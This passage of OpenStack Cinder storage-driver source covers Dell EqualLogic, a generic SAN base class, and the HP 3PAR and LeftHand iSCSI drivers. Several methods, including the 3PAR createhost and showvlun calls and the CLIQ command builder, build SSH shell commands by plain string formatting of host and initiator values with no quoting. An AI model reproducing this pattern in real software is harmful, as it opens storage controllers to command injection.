        data["driver_version"] = self.VERSION
        data["storage_protocol"] = 'iSCSI'

        data['reserved_percentage'] = 0
        data['QoS_support'] = False

        data['total_capacity_gb'] = 'infinite'
        data['free_capacity_gb'] = 'infinite'

        for line in self._eql_execute('pool', 'select',
                                      self.configuration.eqlx_pool, 'show'):
            if line.startswith('TotalCapacity:'):
                out_tup = line.rstrip().partition(' ')
                data['total_capacity_gb'] = self._get_space_in_gb(out_tup[-1])
            if line.startswith('FreeSpace:'):
                out_tup = line.rstrip().partition(' ')
                data['free_capacity_gb'] = self._get_space_in_gb(out_tup[-1])

        self._stats = data

    def _check_volume(self, volume):
        """Check if the volume exists on the Array."""
        command = ['volume', 'select', volume['name'], 'show']
        try:
            self._eql_execute(*command)
        except processutils.ProcessExecutionError as err:
            with excutils.save_and_reraise_exception():
                if err.stdout.find('does not exist.\n') > -1:
                    LOG.debug(_('Volume %s does not exist, '
                                'it may have already been deleted'),
                              volume['name'])
                    raise exception.VolumeNotFound(volume_id=volume['id'])

    def do_setup(self, context):
        """Disable cli confirmation and tune output format."""
        try:
            disabled_cli_features = ('confirmation', 'paging', 'events',
                                     'formatoutput')
            for feature in disabled_cli_features:
                self._eql_execute('cli-settings', feature, 'off')

            for line in self._eql_execute('grpparams', 'show'):
                if line.startswith('Group-Ipaddress:'):
                    out_tup = line.rstrip().partition(' ')
                    self._group_ip = out_tup[-1]

            LOG.info(_("EQL-driver: Setup is complete, group IP is %s"),
                     self._group_ip)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to setup the Dell EqualLogic driver'))

    def create_volume(self, volume):
        """Create a volume."""
        try:
            cmd = ['volume', 'create',
                   volume['name'], "%sG" % (volume['size'])]
            if self.configuration.eqlx_pool != 'default':
                cmd.append('pool')
                cmd.append(self.configuration.eqlx_pool)
            if self.configuration.san_thin_provision:
                cmd.append('thin-provision')
            out = self._eql_execute(*cmd)
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create volume %s'), volume['name'])

    def delete_volume(self, volume):
        """Delete a volume."""
        try:
            self._check_volume(volume)
            self._eql_execute('volume', 'select', volume['name'], 'offline')
            self._eql_execute('volume', 'delete', volume['name'])
        except exception.VolumeNotFound:
            LOG.warn(_('Volume %s was not found while trying to delete it'),
                     volume['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to delete volume %s'), volume['name'])

    def create_snapshot(self, snapshot):
        """"Create snapshot of existing volume on appliance."""
        try:
            out = self._eql_execute('volume', 'select',
                                    snapshot['volume_name'],
                                    'snapshot', 'create-now')
            prefix = 'Snapshot name is '
            snap_name = self._get_prefixed_value(out, prefix)
            self._eql_execute('volume', 'select', snapshot['volume_name'],
                              'snapshot', 'rename', snap_name,
                              snapshot['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create snapshot of volume %s'),
                          snapshot['volume_name'])

    def create_volume_from_snapshot(self, volume, snapshot):
        """Create new volume from other volume's snapshot on appliance."""
        try:
            out = self._eql_execute('volume', 'select',
                                    snapshot['volume_name'], 'snapshot',
                                    'select', snapshot['name'],
                                    'clone', volume['name'])
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create volume from snapshot %s'),
                          snapshot['name'])

    def create_cloned_volume(self, volume, src_vref):
        """Creates a clone of the specified volume."""
        try:
            src_volume_name = self.configuration.\
                volume_name_template % src_vref['id']
            out = self._eql_execute('volume', 'select', src_volume_name,
                                    'clone', volume['name'])
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create clone of volume %s'),
                          volume['name'])

    def delete_snapshot(self, snapshot):
        """Delete volume's snapshot."""
        try:
            self._eql_execute('volume', 'select', snapshot['volume_name'],
                              'snapshot', 'delete', snapshot['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to delete snapshot %(snap)s of '
                            'volume %(vol)s'),
                          {'snap': snapshot['name'],
                           'vol': snapshot['volume_name']})

    def initialize_connection(self, volume, connector):
        """Restrict access to a volume."""
        try:
            cmd = ['volume', 'select', volume['name'], 'access', 'create',
                   'initiator', connector['initiator']]
            if self.configuration.eqlx_use_chap:
                cmd.extend(['authmethod chap', 'username',                    
                            self.configuration.eqlx_chap_login])
            self._eql_execute(*cmd)
            iscsi_properties = self._get_iscsi_properties(volume)
            return {
                'driver_volume_type': 'iscsi',
                'data': iscsi_properties
            }
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to initialize connection to volume %s'),
                          volume['name'])

    def terminate_connection(self, volume, connector, force=False, **kwargs):
        """Remove access restrictions from a volume."""
        try:
            self._eql_execute('volume', 'select', volume['name'],
                              'access', 'delete', '1')
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to terminate connection to volume %s'),
                          volume['name'])

    def create_export(self, context, volume):
        """Create an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation.
        """
        pass

    def ensure_export(self, context, volume):
        """Ensure an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation. We will just make
        sure that the volume exists on the array and issue a warning.
        """
        try:
            self._check_volume(volume)
        except exception.VolumeNotFound:
            LOG.warn(_('Volume %s is not found!, it may have been deleted'),
                     volume['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to ensure export of volume %s'),
                          volume['name'])

    def remove_export(self, context, volume):
        """Remove an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation.
        Nothing to remove since there's nothing exported.
        """
        pass

    def extend_volume(self, volume, new_size):
        """Extend the size of the volume."""
        try:
            self._eql_execute('volume', 'select', volume['name'],
                              'size', "%sG" % new_size)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to extend_volume %(name)s from '
                            '%(current_size)sGB to %(new_size)sGB'),
                          {'name': volume['name'],
                           'current_size': volume['size'],
                           'new_size': new_size})

    def local_path(self, volume):
        raise NotImplementedError()

# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2011 Justin Santa Barbara
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
"""
Default Driver for san-stored volumes.

The unique thing about a SAN is that we don't expect that we can run the volume
controller on the SAN hardware.  We expect to access it over SSH or some API.
"""

import random

from eventlet import greenthread
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import utils
from cinder.volume import driver

LOG = logging.getLogger(__name__)

san_opts = [
    cfg.BoolOpt('san_thin_provision',
                default=True,
                help='Use thin provisioning for SAN volumes?'),
    cfg.StrOpt('san_ip',
               default='',
               help='IP address of SAN controller'),
    cfg.StrOpt('san_login',
               default='admin',
               help='Username for SAN controller'),
    cfg.StrOpt('san_password',
               default='',
               help='Password for SAN controller',
               secret=True),
    cfg.StrOpt('san_private_key',
               default='',
               help='Filename of private key to use for SSH authentication'),
    cfg.StrOpt('san_clustername',
               default='',
               help='Cluster name to use for creating volumes'),
    cfg.IntOpt('san_ssh_port',
               default=22,
               help='SSH port to use with SAN'),
    cfg.BoolOpt('san_is_local',
                default=False,
                help='Execute commands locally instead of over SSH; '
                     'use if the volume service is running on the SAN device'),
    cfg.IntOpt('ssh_conn_timeout',
               default=30,
               help="SSH connection timeout in seconds"),
    cfg.IntOpt('ssh_min_pool_conn',
               default=1,
               help='Minimum ssh connections in the pool'),
    cfg.IntOpt('ssh_max_pool_conn',
               default=5,
               help='Maximum ssh connections in the pool'),
]

CONF = cfg.CONF
CONF.register_opts(san_opts)


class SanDriver(driver.VolumeDriver):
    """Base class for SAN-style storage volumes

    A SAN-style storage value is 'different' because the volume controller
    probably won't run on it, so we need to access is over SSH or another
    remote protocol.
    """

    def __init__(self, *args, **kwargs):
        execute = kwargs.pop('execute', self.san_execute)
        super(SanDriver, self).__init__(execute=execute,
                                        *args, **kwargs)
        self.configuration.append_config_values(san_opts)
        self.run_local = self.configuration.san_is_local
        self.sshpool = None

    def san_execute(self, *cmd, **kwargs):
        if self.run_local:
            return utils.execute(*cmd, **kwargs)
        else:
            check_exit_code = kwargs.pop('check_exit_code', None)
            command = ' '.join(cmd)
            return self._run_ssh(command, check_exit_code)

    def _run_ssh(self, command, check_exit_code=True, attempts=1):                    
        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
                                         min_size=min_size,
                                         max_size=max_size)
        last_exception = None
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        return utils.ssh_execute(
                            ssh,
                            command,
                            check_exit_code=check_exit_code)
                    except Exception as e:
                        LOG.error(e)
                        last_exception = e
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                try:
                    raise exception.ProcessExecutionError(
                        exit_code=last_exception.exit_code,
                        stdout=last_exception.stdout,
                        stderr=last_exception.stderr,
                        cmd=last_exception.cmd)
                except AttributeError:
                    raise exception.ProcessExecutionError(
                        exit_code=-1,
                        stdout="",
                        stderr="Error running SSH command",
                        cmd=command)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_("Error running SSH command: %s") % command)

    def ensure_export(self, context, volume):
        """Synchronously recreates an export for a logical volume."""
        pass

    def create_export(self, context, volume):
        """Exports the volume."""
        pass

    def remove_export(self, context, volume):
        """Removes an export for a logical volume."""
        pass

    def check_for_setup_error(self):
        """Returns an error if prerequisites aren't met."""
        if not self.run_local:
            if not (self.configuration.san_password or
                    self.configuration.san_private_key):
                raise exception.InvalidInput(
                    reason=_('Specify san_password or san_private_key'))

        # The san_ip must always be set, because we use it for the target
        if not self.configuration.san_ip:
            raise exception.InvalidInput(reason=_("san_ip must be set"))


class SanISCSIDriver(SanDriver, driver.ISCSIDriver):
    def __init__(self, *args, **kwargs):
        super(SanISCSIDriver, self).__init__(*args, **kwargs)

    def _build_iscsi_target_name(self, volume):
        return "%s%s" % (self.configuration.iscsi_target_prefix,
                         volume['name'])


# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
"""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR iSCSI Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver
"""

import sys

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)
DEFAULT_ISCSI_PORT = 3260


class HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):
    """OpenStack iSCSI driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware.

    """
    def __init__(self, *args, **kwargs):
        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """Sanity check to ensure we have required options set."""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password', 'san_ip', 'san_login',
                          'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'iSCSI'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()

        # map iscsi_ip-> ip_port
        #             -> iqn
        #             -> nsp
        self.iscsi_ips = {}
        temp_iscsi_ip = {}

        # use the 3PAR ip_addr list for iSCSI configuration
        if len(self.configuration.hp3par_iscsi_ips) > 0:
            # add port values to ip_addr, if necessary
            for ip_addr in self.configuration.hp3par_iscsi_ips:
                ip = ip_addr.split(':')
                if len(ip) == 1:
                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}
                elif len(ip) == 2:
                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}
                else:
                    msg = _("Invalid IP address format '%s'") % ip_addr
                    LOG.warn(msg)

        # add the single value iscsi_ip_address option to the IP dictionary.
        # This way we can see if it's a valid iSCSI IP. If it's not valid,
        # we won't use it and won't bother to report it, see below
        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):
            ip = self.configuration.iscsi_ip_address
            ip_port = self.configuration.iscsi_port
            temp_iscsi_ip[ip] = {'ip_port': ip_port}

        # get all the valid iSCSI ports from 3PAR
        # when found, add the valid iSCSI ip, ip port, iqn and nsp
        # to the iSCSI IP dictionary
        # ...this will also make sure ssh works.
        iscsi_ports = self.common.get_ports()['iSCSI']
        for (ip, iscsi_info) in iscsi_ports.iteritems():
            if ip in temp_iscsi_ip:
                ip_port = temp_iscsi_ip[ip]['ip_port']
                self.iscsi_ips[ip] = {'ip_port': ip_port,
                                      'nsp': iscsi_info['nsp'],
                                      'iqn': iscsi_info['iqn']
                                      }
                del temp_iscsi_ip[ip]

        # if the single value iscsi_ip_address option is still in the
        # temp dictionary it's because it defaults to $my_ip which doesn't
        # make sense in this context. So, if present, remove it and move on.
        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):
            del temp_iscsi_ip[self.configuration.iscsi_ip_address]

        # lets see if there are invalid iSCSI IPs left in the temp dict
        if len(temp_iscsi_ip) > 0:
            msg = _("Found invalid iSCSI IP address(s) in configuration "
                    "option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'") % \
                   (", ".join(temp_iscsi_ip))
            LOG.warn(msg)

        if not len(self.iscsi_ips) > 0:
            msg = _('At least one valid iSCSI IP address must be set.')
            raise exception.InvalidInput(reason=(msg))

        self.common.do_setup(context)

    def check_for_setup_error(self):
        """Returns an error if prerequisites aren't met."""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()

        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        """Clone an existing volume."""
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()

        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        Steps to export a volume on 3PAR
          * Get the 3PAR iSCSI iqn
          * Create a host on the 3par
          * create vlun on the 3par
        """
        self.common.client_login()

        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        self.common.client_logout()

        iscsi_ip = self._get_iscsi_ip(host['name'])
        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']
        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']
        info = {'driver_volume_type': 'iscsi',
                'data': {'target_portal': "%s:%s" %
                         (iscsi_ip, iscsi_ip_port),
                         'target_iqn': iscsi_target_iqn,
                         'target_lun': vlun['lun'],
                         'target_discovered': True
                         }
                }
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """Driver entry point to unattach a volume from an instance."""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['initiator'])
        self.common.client_logout()

    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):
        """Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same iqn but with a different hostname, return the hostname
        used by 3PAR.
        """
        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \                    
              (persona_id, domain, hostname, iscsi_iqn)                    
        out = self.common._cli_run(cmd, None)                    
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)
        return hostname

    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):
        # when using -add, you can not send the persona or domain options
        self.common._cli_run('createhost -iscsi -add %s %s'                    
                             % (hostname, iscsi_iqn), None)                    

    def _create_host(self, volume, connector):
        """Creates or modifies existing 3PAR host."""
        # make sure we don't have the host already
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['iSCSIPaths']:
                self._modify_3par_iscsi_host(hostname, connector['initiator'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_iscsi_host(hostname,
                                                    connector['initiator'],
                                                    domain,
                                                    persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def _get_iscsi_ip(self, hostname):
        """Get an iSCSI IP address to use.

        Steps to determine which IP address to use.
          * If only one IP address, return it
          * If there is an active vlun, return the IP associated with it
          * Return IP with fewest active vluns
        """
        if len(self.iscsi_ips) == 1:
            return self.iscsi_ips.keys()[0]

        # if we currently have an active port, use it
        nsp = self._get_active_nsp(hostname)

        if nsp is None:
            # no active vlun, find least busy port
            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())
            if nsp is None:
                msg = _("Least busy iSCSI port not found, "
                        "using first iSCSI port in list.")
                LOG.warn(msg)
                return self.iscsi_ips.keys()[0]

        return self._get_ip_using_nsp(nsp)

    def _get_iscsi_nsps(self):
        """Return the list of candidate nsps."""
        nsps = []
        for value in self.iscsi_ips.values():
            nsps.append(value['nsp'])
        return nsps

    def _get_ip_using_nsp(self, nsp):
        """Return IP assiciated with given nsp."""
        for (key, value) in self.iscsi_ips.items():
            if value['nsp'] == nsp:
                return key

    def _get_active_nsp(self, hostname):
        """Return the active nsp, if one exists, for the given host."""
        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)                    
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                info = line.split(",")
                if info and len(info) > 4:
                    return info[4]

    def _get_least_used_nsp(self, nspss):
        """"Return the nsp that has the fewest active vluns."""
        # return only the nsp (node:server:port)
        result = self.common._cli_run('showvlun -a -showcols Port', None)                    

        # count the number of nsps (there is 1 for each active vlun)
        nsp_counts = {}
        for nsp in nspss:
            # initialize counts to zero
            nsp_counts[nsp] = 0

        current_least_used_nsp = None
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                nsp = line.strip()
                if nsp in nsp_counts:
                    nsp_counts[nsp] = nsp_counts[nsp] + 1

            # identify key (nsp) of least used nsp
            current_smallest_count = sys.maxint
            for (nsp, count) in nsp_counts.iteritems():
                if count < current_smallest_count:
                    current_least_used_nsp = nsp
                    current_smallest_count = count

        return current_least_used_nsp

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)

#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
"""
HP Lefthand SAN ISCSI Driver.

The driver communicates to the backend aka Cliq via SSH to perform all the
operations on the SAN.
"""
from lxml import etree

from cinder import exception
from cinder.openstack.common import log as logging
from cinder.volume.drivers.san.san import SanISCSIDriver


LOG = logging.getLogger(__name__)


class HpSanISCSIDriver(SanISCSIDriver):
    """Executes commands relating to HP/Lefthand SAN ISCSI volumes.

    We use the CLIQ interface, over SSH.

    Rough overview of CLIQ commands used:

    :createVolume:    (creates the volume)

    :getVolumeInfo:    (to discover the IQN etc)

    :getClusterInfo:    (to discover the iSCSI target IP address)

    :assignVolumeChap:    (exports it with CHAP security)

    The 'trick' here is that the HP SAN enforces security by default, so
    normally a volume mount would need both to configure the SAN in the volume
    layer and do the mount on the compute layer.  Multi-layer operations are
    not catered for at the moment in the cinder architecture, so instead we
    share the volume using CHAP at volume creation time.  Then the mount need
    only use those CHAP credentials, so can take place exclusively in the
    compute layer.
    """

    device_stats = {}

    def __init__(self, *args, **kwargs):
        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)
        self.cluster_vip = None

    def _cliq_run(self, verb, cliq_args, check_exit_code=True):
        """Runs a CLIQ command over SSH, without doing any result parsing"""
        cliq_arg_strings = []                    
        for k, v in cliq_args.items():
            cliq_arg_strings.append(" %s=%s" % (k, v))                    
        cmd = verb + ''.join(cliq_arg_strings)                    

        return self._run_ssh(cmd, check_exit_code)                    

    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):
        """Runs a CLIQ command over SSH, parsing and checking the output"""
        cliq_args['output'] = 'XML'
        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)

        LOG.debug(_("CLIQ command returned %s"), out)

        result_xml = etree.fromstring(out)
        if check_cliq_result:
            response_node = result_xml.find("response")
            if response_node is None:
                msg = (_("Malformed response to CLIQ command "
                         "%(verb)s %(cliq_args)s. Result=%(out)s") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

            result_code = response_node.attrib.get("result")

            if result_code != "0":
                msg = (_("Error running CLIQ command %(verb)s %(cliq_args)s. "
                         " Result=%(out)s") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

        return result_xml

    def _cliq_get_cluster_info(self, cluster_name):
        """Queries for info about the cluster (including IP)"""
        cliq_args = {}
        cliq_args['clusterName'] = cluster_name
        cliq_args['searchDepth'] = '1'
        cliq_args['verbose'] = '0'

        result_xml = self._cliq_run_xml("getClusterInfo", cliq_args)

        return result_xml

    def _cliq_get_cluster_vip(self, cluster_name):
        """Gets the IP on which a cluster shares iSCSI volumes"""
        cluster_xml = self._cliq_get_cluster_info(cluster_name)

        vips = []
        for vip in cluster_xml.findall("response/cluster/vip"):
            vips.append(vip.attrib.get('ipAddress'))

        if len(vips) == 1:
            return vips[0]

        _xml = etree.tostring(cluster_xml)
        msg = (_("Unexpected number of virtual ips for cluster "
                 " %(cluster_name)s. Result=%(_xml)s") %
               {'cluster_name': cluster_name, '_xml': _xml})
        raise exception.VolumeBackendAPIException(data=msg)

    def _cliq_get_volume_info(self, volume_name):
        """Gets the volume info, including IQN"""
        cliq_args = {}
        cliq_args['volumeName'] = volume_name
        result_xml = self._cliq_run_xml("getVolumeInfo", cliq_args)

        # Result looks like this:
        #<gauche version="1.0">
        #  <response description="Operation succeeded." name="CliqSuccess"
        #            processingTime="87" result="0">
        #    <volume autogrowPages="4" availability="online" blockSize="1024"
        #       bytesWritten="0" checkSum="false" clusterName="Cluster01"
        #       created="2011-02-08T19:56:53Z" deleting="false" description=""
        #       groupName="Group01" initialQuota="536870912" isPrimary="true"
        #       iscsiIqn="iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b"
        #       maxSize="6865387257856" md5="9fa5c8b2cca54b2948a63d833097e1ca"
        #       minReplication="1" name="vol-b" parity="0" replication="2"
        #       reserveQuota="536870912" scratchQuota="4194304"
        #       serialNumber="9fa5c8b2cca54b2948a63d833097e1ca0000000000006316"
        #       size="1073741824" stridePages="32" thinProvision="true">
        #      <status description="OK" value="2"/>
        #      <permission access="rw"
        #            authGroup="api-34281B815713B78-(trimmed)51ADD4B7030853AA7"
        #            chapName="chapusername" chapRequired="true" id="25369"
        #            initiatorSecret="" iqn="" iscsiEnabled="true"
        #            loadBalance="true" targetSecret="supersecret"/>
        #    </volume>
        #  </response>
        #</gauche>

        # Flatten the nodes into a dictionary; use prefixes to avoid collisions
        volume_attributes = {}

        volume_node = result_xml.find("response/volume")
        for k, v in volume_node.attrib.items():
            volume_attributes["volume." + k] = v

        status_node = volume_node.find("status")
        if status_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes["status." + k] = v

        # We only consider the first permission node
        permission_node = volume_node.find("permission")
        if permission_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes["permission." + k] = v

        LOG.debug(_("Volume info: %(volume_name)s => %(volume_attributes)s") %
                  {'volume_name': volume_name,
                   'volume_attributes': volume_attributes})
        return volume_attributes

    def create_volume(self, volume):
        """Creates a volume."""
        cliq_args = {}
        cliq_args['clusterName'] = self.configuration.san_clustername

        if self.configuration.san_thin_provision:
            cliq_args['thinProvision'] = '1'
        else:
            cliq_args['thinProvision'] = '0'

        cliq_args['volumeName'] = volume['name']
        if int(volume['size']) == 0:
            cliq_args['size'] = '100MB'
        else:
            cliq_args['size'] = '%sGB' % volume['size']

        self._cliq_run_xml("createVolume", cliq_args)

        volume_info = self._cliq_get_volume_info(volume['name'])
        cluster_name = volume_info['volume.clusterName']
        iscsi_iqn = volume_info['volume.iscsiIqn']

        #TODO(justinsb): Is this always 1? Does it matter?
        cluster_interface = '1'

        if not self.cluster_vip:
            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)
        iscsi_portal = self.cluster_vip + ":3260," + cluster_interface

        model_update = {}

        # NOTE(jdg): LH volumes always at lun 0 ?
        model_update['provider_location'] = ("%s %s %s" %
                                             (iscsi_portal,
                                              iscsi_iqn,
                                              0))

        return model_update

    def create_volume_from_snapshot(self, volume, snapshot):
        """Creates a volume from a snapshot."""
        raise NotImplementedError()

    def create_snapshot(self, snapshot):
        """Creates a snapshot."""
        raise NotImplementedError()

    def delete_volume(self, volume):
        """Deletes a volume."""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['prompt'] = 'false'  # Don't confirm
        try:
            volume_info = self._cliq_get_volume_info(volume['name'])
        except exception.ProcessExecutionError:
            LOG.error("Volume did not exist. It will not be deleted")
            return
        self._cliq_run_xml("deleteVolume", cliq_args)

    def local_path(self, volume):
        msg = _("local_path not supported")
        raise exception.VolumeBackendAPIException(data=msg)

    def initialize_connection(self, volume, connector):
        """Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host. HP VSA requires a volume to be assigned
        to a server.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        """
        self._create_server(connector)
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml("assignVolumeToServer", cliq_args)

        iscsi_properties = self._get_iscsi_properties(volume)
        return {
            'driver_volume_type': 'iscsi',
            'data': iscsi_properties
        }

    def _create_server(self, connector):
        cliq_args = {}
        cliq_args['serverName'] = connector['host']
        out = self._cliq_run_xml("getServerInfo", cliq_args, False)
        response = out.find("response")
